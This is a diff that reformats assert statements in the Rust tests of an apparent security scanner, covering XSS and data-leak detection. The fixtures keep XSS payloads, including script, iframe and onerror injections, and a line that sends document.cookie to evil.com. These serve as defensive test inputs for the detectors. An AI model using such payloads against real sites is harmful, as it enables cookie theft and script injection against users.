@@ -128,10 +128,12 @@ fn text_diff_detects_email_leak() {
 
     let result = text_diff(before, after);
     assert!(result.has_data_leak);
-    assert!(result
-        .leaked_patterns
-        .iter()
-        .any(|p| p.pattern_type == LeakPatternType::Email));
+    assert!(
+        result
+            .leaked_patterns
+            .iter()
+            .any(|p| p.pattern_type == LeakPatternType::Email)
+    );
 }
 
 #[test]
@@ -141,10 +143,12 @@ fn text_diff_detects_sql_error_leak() {
 
     let result = text_diff(before, after);
     assert!(result.has_data_leak);
-    assert!(result
-        .leaked_patterns
-        .iter()
-        .any(|p| p.pattern_type == LeakPatternType::SqlError));
+    assert!(
+        result
+            .leaked_patterns
+            .iter()
+            .any(|p| p.pattern_type == LeakPatternType::SqlError)
+    );
 }
 
 #[test]
@@ -154,10 +158,12 @@ fn text_diff_detects_path_leak() {
 
     let result = text_diff(before, after);
     assert!(result.has_data_leak);
-    assert!(result
-        .leaked_patterns
-        .iter()
-        .any(|p| p.pattern_type == LeakPatternType::InternalPath));
+    assert!(
+        result
+            .leaked_patterns
+            .iter()
+            .any(|p| p.pattern_type == LeakPatternType::InternalPath)
+    );
 }
 
 #[test]
@@ -167,10 +173,12 @@ fn text_diff_detects_stack_trace() {
 
     let result = text_diff(before, after);
     assert!(result.has_data_leak);
-    assert!(result
-        .leaked_patterns
-        .iter()
-        .any(|p| p.pattern_type == LeakPatternType::StackTrace));
+    assert!(
+        result
+            .leaked_patterns
+            .iter()
+            .any(|p| p.pattern_type == LeakPatternType::StackTrace)
+    );
 }
 
 #[test]
@@ -179,12 +187,16 @@ fn detect_new_script_tag_xss() {
     let after = "<html><body><p>Normal</p><script>alert('xss')</script></body></html>";
 
     let indicators = detect_xss_indicators(before, after);
-    assert!(indicators
-        .iter()
-        .any(|i| i.indicator_type == XssIndicatorType::NewScriptTag));
-    assert!(indicators
-        .iter()
-        .any(|i| i.indicator_type == XssIndicatorType::AlertDialog));
+    assert!(
+        indicators
+            .iter()
+            .any(|i| i.indicator_type == XssIndicatorType::NewScriptTag)
+    );
+    assert!(
+        indicators
+            .iter()
+            .any(|i| i.indicator_type == XssIndicatorType::AlertDialog)
+    );
 }
 
 #[test]
@@ -194,9 +206,11 @@ fn detect_new_iframe_xss() {
         "<div>Content</div><iframe src='data:text/html,<script>alert(1)</script>'></iframe>";
 
     let indicators = detect_xss_indicators(before, after);
-    assert!(indicators
-        .iter()
-        .any(|i| i.indicator_type == XssIndicatorType::NewIframe));
+    assert!(
+        indicators
+            .iter()
+            .any(|i| i.indicator_type == XssIndicatorType::NewIframe)
+    );
 }
 
 #[test]
@@ -205,9 +219,11 @@ fn detect_event_handler_injection() {
     let after = r#"<img src="photo.jpg" onerror="alert(1)">"#;
 
     let indicators = detect_xss_indicators(before, after);
-    assert!(indicators
-        .iter()
-        .any(|i| i.indicator_type == XssIndicatorType::NewEventHandler));
+    assert!(
+        indicators
+            .iter()
+            .any(|i| i.indicator_type == XssIndicatorType::NewEventHandler)
+    );
 }
 
 #[test]
@@ -216,9 +232,11 @@ fn detect_cookie_access_injection() {
     let after = "<script>var x = 1; fetch('http://evil.com/?c='+document.cookie);</script>";
 
     let indicators = detect_xss_indicators(before, after);
-    assert!(indicators
-        .iter()
-        .any(|i| i.indicator_type == XssIndicatorType::CookieAccess));
+    assert!(
+        indicators
+            .iter()
+            .any(|i| i.indicator_type == XssIndicatorType::CookieAccess)
+    );
 }
 
 #[test]
@@ -334,8 +352,10 @@ fn detect_database_query_leak() {
 
     let result = text_diff(before, after);
     assert!(result.has_data_leak);
-    assert!(result
-        .leaked_patterns
-        .iter()
-        .any(|p| p.pattern_type == LeakPatternType::DatabaseRecord));
+    assert!(
+        result
+            .leaked_patterns
+            .iter()
+            .any(|p| p.pattern_type == LeakPatternType::DatabaseRecord)
+    );
 }
